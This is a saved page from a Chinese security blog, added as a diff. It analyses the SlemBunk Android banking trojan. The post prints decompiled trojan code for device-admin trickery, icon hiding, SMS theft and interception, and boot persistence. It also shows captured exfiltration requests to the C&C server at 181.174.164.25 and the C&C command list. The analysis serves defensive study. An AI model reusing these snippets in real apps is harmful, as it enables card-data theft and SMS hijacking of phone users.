@@ -1,0 +1,1284 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="eOKt_3ycRCL7ILr4F1AM1eilrWXcADidutENpULFpsE" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="[object Object],木马浅析,木马分析," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="xxlegend" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="SlemBunk最初由FireEye发现，后来其他一些安全公司也相继发现，作者有幸拿到该样本，分析该木马发现其设计精妙绝伦，可在此基础上做进一步演变。该样本伪造成其他一些常用android应用，欺骗用户输入信用卡相关敏感信息，下面我们就一步步分析。 #1 恶意行为  ##1.1 控制锁屏行为控制电源状态为PARTIAL_WAKE_LOCK，在这个状态下，即使关机，cpu也处在运行状态，直到代码主动">
+<meta name="keywords" content="[object Object],木马浅析,木马分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SlemBunk木马浅析">
+<meta property="og:url" content="http://yoursite.com/2016/04/01/SlemBunk木马浅析/index.html">
+<meta property="og:site_name" content="xxlegend">
+<meta property="og:description" content="SlemBunk最初由FireEye发现，后来其他一些安全公司也相继发现，作者有幸拿到该样本，分析该木马发现其设计精妙绝伦，可在此基础上做进一步演变。该样本伪造成其他一些常用android应用，欺骗用户输入信用卡相关敏感信息，下面我们就一步步分析。 #1 恶意行为  ##1.1 控制锁屏行为控制电源状态为PARTIAL_WAKE_LOCK，在这个状态下，即使关机，cpu也处在运行状态，直到代码主动">
+<meta property="og:updated_time" content="2017-05-01T09:39:15.573Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SlemBunk木马浅析">
+<meta name="twitter:description" content="SlemBunk最初由FireEye发现，后来其他一些安全公司也相继发现，作者有幸拿到该样本，分析该木马发现其设计精妙绝伦，可在此基础上做进一步演变。该样本伪造成其他一些常用android应用，欺骗用户输入信用卡相关敏感信息，下面我们就一步步分析。 #1 恶意行为  ##1.1 控制锁屏行为控制电源状态为PARTIAL_WAKE_LOCK，在这个状态下，即使关机，cpu也处在运行状态，直到代码主动">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"right","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2016/04/01/SlemBunk木马浅析/"/>
+
+
+
+
+
+  <title>SlemBunk木马浅析 | xxlegend</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?ae110488ae3a7a2872b00e735070cfbc";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xxlegend</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/04/01/SlemBunk木马浅析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                SlemBunk木马浅析
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-04-01T15:38:36+08:00">
+                2016-04-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/木马/" itemprop="url" rel="index">
+                    <span itemprop="name">木马</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2016/04/01/SlemBunk木马浅析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2016/04/01/SlemBunk木马浅析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2016/04/01/SlemBunk木马浅析/" class="leancloud_visitors" data-flag-title="SlemBunk木马浅析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>SlemBunk最初由FireEye发现，后来其他一些安全公司也相继发现，作者有幸拿到该样本，分析该木马发现其设计精妙绝伦，可在此基础上做进一步演变。该样本伪造成其他一些常用android应用，欺骗用户输入信用卡相关敏感信息，下面我们就一步步分析。</p>
+<p>#1 恶意行为 </p>
+<p>##1.1 控制锁屏行为<br>控制电源状态为PARTIAL_WAKE_LOCK，在这个状态下，即使关机，cpu也处在运行状态，直到代码主动释放。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate();</div><div class="line">        <span class="keyword">this</span>.mWakeLock = <span class="keyword">this</span>. getSystemService(<span class="string">"power"</span> ).newWakeLock (<span class="number">1</span>, <span class="string">"MyWakeLock"</span> );  <span class="comment">// in PARTIAL_WAKE_LOCK mode regardless of the power off</span></div><div class="line">        <span class="keyword">this</span>.mWakeLock .acquire ();</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>##1.2 设备管理员权限<br>获取设备管理员权限，如果没有设备管理员则申请，它会弹出一个界面供用户确认，DEVICE_ADMIN是相应的组件，ADD_EXPLANTION给用户的解释说明<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">public void checkDeviceAdmin() &#123;</div><div class="line">        ComponentName v0 = new ComponentName((( Context)this ), MyDeviceAdminReceiver.class );</div><div class="line">        if(!this .deviceManager. isAdminActive(v0)) &#123;</div><div class="line">            Intent v1 = new Intent( "android.app.action.ADD_DEVICE_ADMIN" );</div><div class="line">            v1. putExtra("android.app.extra.DEVICE_ADMIN" , ((Parcelable) v0));</div><div class="line">            v1. putExtra("android.app.extra.ADD_EXPLANATION" , "Get video codec access");</div><div class="line">            this.startActivity (v1 );</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line">##1.3 隐藏图标</div><div class="line">等用户安装完该应用，激活设备管理权限之后，会隐藏图标,比较有意思的隐藏图标的代码有一小段隐藏代码，对于smali可能不好阅读，但是反编译成java之后，这代码就是小菜一碟。</div><div class="line">```java</div><div class="line">if(("3". equals("3")) || ( "3" .equals( "1" ))) &#123;</div><div class="line">            this.getPackageManager ().setComponentEnabledSetting (new ComponentName(((Context )this), Main</div><div class="line">                    . class), 2 , 1);</div><div class="line">``` </div><div class="line">##1.4 计划任务</div><div class="line"></div><div class="line">```java</div><div class="line">private void scheduleLaunch() &#123;</div><div class="line">        Calendar v0 = Calendar .getInstance ();</div><div class="line">        v0. add( 12, this .restartTimeMinutes);</div><div class="line">        Intent v1 = new Intent( "com.slempo.service.activities.HTMLStart" );</div><div class="line">        v1. putExtra("values" , this. getIntent().getStringExtra ("values"));</div><div class="line">        this.am .set (0, v0. getTimeInMillis(), PendingIntent.getBroadcast (((Context) this), 0 , v1 , 0));</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line"></div><div class="line">##1.5获取运行的应用</div><div class="line">slembunk木马会根据当前正在运行的应用来决定是否启用信用卡欺骗页面</div><div class="line">```java</div><div class="line">    private String getTopRunning() &#123;</div><div class="line">        List v1 = this .getSystemService ("activity"). getRunningTasks(1 );</div><div class="line">        String v3 = !v1.isEmpty() ? v1.get(0 ).topActivity. getPackageName() : "" ;</div><div class="line">        return v3;</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line">##1.6 获取短信记录</div><div class="line">```java</div><div class="line">public static String readMessagesFromDeviceDB (Context context) &#123;</div><div class="line">        Cursor v8;</div><div class="line">        Uri v1 = Uri .parse ("content://sms/inbox");</div><div class="line">        String[] v2 = new String[]&#123; "_id", "address" , "body", "date"&#125;;</div><div class="line">        JSONArray v12 = new JSONArray();</div><div class="line">        try &#123;</div><div class="line">            v8 = context.getContentResolver ().query (v1 , v2 , null, null, null );</div><div class="line">            if(v8 != null ) &#123;</div><div class="line">                if(!v8.moveToFirst ()) &#123;</div><div class="line">                    goto label_55 ;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                do &#123;</div><div class="line">                    String v6 = v8.getString(v8.getColumnIndex ("address"));</div><div class="line">                    String v7 = v8.getString(v8.getColumnIndex ("body"));</div><div class="line">                    String v9 = new SimpleDateFormat( "dd-MM-yyyy HH:mm:ss" , Locale.US ).format (new Date(</div><div class="line">                            Long.parseLong(v8.getString(v8.getColumnIndex ("date")))));</div><div class="line">                    JSONObject v13 = new JSONObject();</div><div class="line">                    v13. put( "from", v6);</div><div class="line">                    v13. put( "body", v7);</div><div class="line">                    v13. put( "date", v9);</div><div class="line">                    v12. put( v13);</div><div class="line">                    if(v8.moveToNext ()) &#123;</div><div class="line">                        continue;</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    break;</div><div class="line">                &#125;</div><div class="line">                while(true );</div><div class="line">            &#125;</div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
+<p>##1.6获取电话号码<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">public static String getPhoneNumber(Context context ) &#123;</div><div class="line">        String v0 = context.getSystemService ("phone"). getLine1Number();</div><div class="line">        if(v0 == null || (v0. equals("" ))) &#123;</div><div class="line">            v0 = "";</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return v0;</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line"></div><div class="line">##1.7 获取DeviceID</div><div class="line">```java</div><div class="line">  public static String getDeviceId (Context context) &#123;</div><div class="line">        String v1;</div><div class="line">        String v0 = context.getSystemService ("phone"). getDeviceId();</div><div class="line">        if((v0.equals("" )) || v0 == null || (v0.equals("000000000000000" ))) &#123;</div><div class="line">            v0 = Settings$Secure.getString(context.getContentResolver (), "android_id" );</div><div class="line">            if(v0 != null &amp;&amp; !v0. equals("" )) &#123;</div><div class="line">                return v0;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            v0 = Build.SERIAL ;</div><div class="line">            if(v0 != null &amp;&amp; !v0. equals("" ) &amp;&amp; !v0. equalsIgnoreCase("unknown" )) &#123;</div><div class="line">                return v0;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            v1 = "not available";</div><div class="line">        &#125;</div><div class="line">        else &#123;</div><div class="line">            v1 = v0;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return v1;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>##1.8 设置开机启动<br>木马会被设置成开机启动并且监听外部sd卡，当sd卡准备好之后也会被启动。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:enabled</span>=<span class="string">"true "</span> <span class="attr">android:exported</span>=<span class="string">" true"</span> <span class="attr">android:name</span>=<span class="string">".reiujdksmcoiwerj "</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE "</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:enabled</span>=<span class="string">"true "</span> <span class="attr">android:exported</span>=<span class="string">" true"</span> <span class="attr">android:name</span>=<span class="string">".hujnkij8uijkjlmj "</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.BOOT_COMPLETED "</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>##1.9 监听短信<br>木马通过短信下发cc指令,从如下AndroidMenifest.xml部分文件可看出，木马对短信应用进行监听，并且权限高于系统短信应用。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt; <span class="attr">receiver</span> <span class="attr">android:enabled</span> =<span class="string">"true"</span> <span class="attr">android:exported</span>=<span class="string">"true "</span> <span class="attr">android:name</span>=<span class="string">".riejkmdcwepoksmieru "</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">"999 "</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.provider.Telephony.SMS_RECEIVED "</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></div><div class="line">``` </div><div class="line">下面是recevier的onReceive方法：</div><div class="line">```java</div><div class="line">    public void onReceive(Context context, Intent intent ) &#123;</div><div class="line">        SharedPreferences v8 = context.getSharedPreferences ("AppPrefs", 0);</div><div class="line">        new HashSet ();</div><div class="line">        try &#123;</div><div class="line">            Object v1 = DATAWraper .deserialize (v8 .getString ("BLOCKED_NUMBERS", DATAWraper.serialize(</div><div class="line">                    new HashSet ())));</div><div class="line">        &#125;</div><div class="line">        catch(Exception v2 ) &#123;</div><div class="line">            v2. printStackTrace();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        Map v3 = SendSMSRecevier .retrieveMessages (intent );</div><div class="line">        Iterator v10 = v3.keySet().iterator ();</div><div class="line">        while(v10.hasNext()) &#123;</div><div class="line">            Object v7 = v10.next();</div><div class="line">            CommandCenter v6 = new CommandCenter( v3. get( v7), "", context);</div><div class="line">            if(v6.processCommand ()) &#123;</div><div class="line">                this.abortBroadcast ();</div><div class="line">                continue;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            boolean v4 = v6.needToInterceptIncoming ();</div><div class="line">            boolean v5 = v6.needToListen ();</div><div class="line">            if(!v4 &amp;&amp; !((HashSet )v1 ).contains (v7 )) &#123;</div><div class="line">                if(!v5) &#123;</div><div class="line">                    continue;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                SendData.sendListenedIncomingSMS (context , v3 .get (v7 ), ((String)v7));</div><div class="line">                continue;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            SendData.sendInterceptedIncomingSMS (context , v3 .get (v7 ), ((String)v7));</div><div class="line">            this.abortBroadcast ();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line"></div><div class="line">#2 木马工作流程</div><div class="line">木马在AndroidManifest.xml中监听了SMS_RECEIVED，ACTION_EXTERNAL_APPLICATIONS_AVAILABLE，BOOT_COMPLETED，DEVICE_ADMIN_ENABLED，com.slempo.service.activities.HTMLStart这五个action，同时注册了几个activity和一个service，除主activity外，其他都是一些欺骗页面，service则负责启动相应activity，请求设备管理权限等。下面简单看下代码流程：</div><div class="line">![][1]</div><div class="line">在main activity中会启动MainServiceStart服务，这个服务会启动三个线程周期性轮询，判断当前应用启动伪信用卡界面；请求deviceAdmin权限；判断指令启动相应的伪界面；发送电话，ime等敏感信息。发送敏感信息的请求如下：</div></pre></td></tr></table></figure></p>
+<p>POST / HTTP/1.1<br>Content-Length: 481<br>Content-Type: text/plain; charset=UTF-8<br>Host: 181.174.164.25:2080<br>Connection: Keep-Alive<br>User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)</p>
+<p>{“os”:”4.0.4”,”model”:”Unknown sdk”,”phone number”:”15555215554”,”apps”:[“com.android.gesture.builder”,”com.android.widgetpreview”,”com.example.android.apis”,”com.example.android.livecubes”,”com.example.android.softkeyboard”,”com.joeykrim.rootcheck”,”de.robv.android.xposed.installer”,”de.robv.android.xposed.installer.staticbusybox”,”eu.chainfire.supersu”,”org.slempo.service”],”imei”:”8f986e65d50f299a”,”client number”:”3”,”type”:”device info”,”operator”:”310260”,”country”:”US”}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">前面也说到了木马会根据当前正在运行的应用来决定是否启动伪信用卡页面，伪界面如下</div><div class="line">![添加信用卡][2]</div><div class="line">![添加详细信息][3]</div><div class="line">木马作者对上述用户信息做了严格校验，首先是信用卡信息必须合法，其次过期时间必须在2014到2020年之间，到了信用卡地址信息页面，对邮政编码和电话号码做了严格的关联，用户填完所有信息之后就会发送给c&amp;c主机，请求如下：</div></pre></td></tr></table></figure></p>
+<p>POST / HTTP/1.1<br>Content-Length: 401<br>Content-Type: text/plain; charset=UTF-8<br>Host: 181.174.164.25:2080<br>Connection: Keep-Alive<br>User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)</p>
+<p>{“data”:{“additional information”:{“old vbv password”:”123456”,”vbv password”:”qwerty”},”type”:”card information”,”card”:{“cvc”:”393”,”month”:”12”,”year”:”15”,”number”:”4024 0238 6573 0515”},”billing address”:{“date of birth”:”01.03.1990”,”phone number”:”212-925-2355”,”street address”:”dalianganjinzi”,”zip code”:”10002”,”phone prefix”:”+1”,”name on card”:”Zhanghua”}},”type”:”user data”,”code”:”-1”}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">附录 c&amp;c指令</div></pre></td></tr></table></figure></p>
+<p>CommandCenter.commands. add(“#intercept_sms_start”);<br>CommandCenter.commands .add (“#intercept_sms_stop”)<br>CommandCenter.commands .add (“#block_numbers”);<br>CommandCenter.commands .add (“#unblock_all_numbers”);<br>CommandCenter.commands .add (“#unblock_numbers”);<br>CommandCenter.commands .add (“#lock”);<br>CommandCenter.commands .add (“#unlock”);<br>CommandCenter.commands .add (“#send” + “_sms”);<br>CommandCenter.commands .add (“#forward” + “_calls”);<br>CommandCenter.commands .add (“#disable_forward_calls”);<br>CommandCenter.commands .add (“#control_number”);<br>CommandCenter.commands .add (“#update_html”);<br>CommandCenter.commands .add (“#show_html”);<br>CommandCenter.commands .add (“#wipe_data”);<br>```</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/object-Object/" rel="tag"># [object Object]</a>
+          
+            <a href="/tags/木马浅析/" rel="tag"># 木马浅析</a>
+          
+            <a href="/tags/木马分析/" rel="tag"># 木马分析</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/02/01/Burpsuite插件开发之RSA加解密/" rel="next" title="Burpsuite 插件开发之RSA加解密">
+                <i class="fa fa-chevron-left"></i> Burpsuite 插件开发之RSA加解密
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/04/01/基于mezzanine的攻防比赛环境搭建及XXE漏洞构造/" rel="prev" title="基于mezzanine的攻防比赛环境搭建及XXE漏洞构造">
+                基于mezzanine的攻防比赛环境搭建及XXE漏洞构造 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview sidebar-panel sidebar-panel-active">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="廖新喜" />
+          <p class="site-author-name" itemprop="name">廖新喜</p>
+           
+              <p class="site-description motion-element" itemprop="description">分享些安全编码，漏洞分析</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
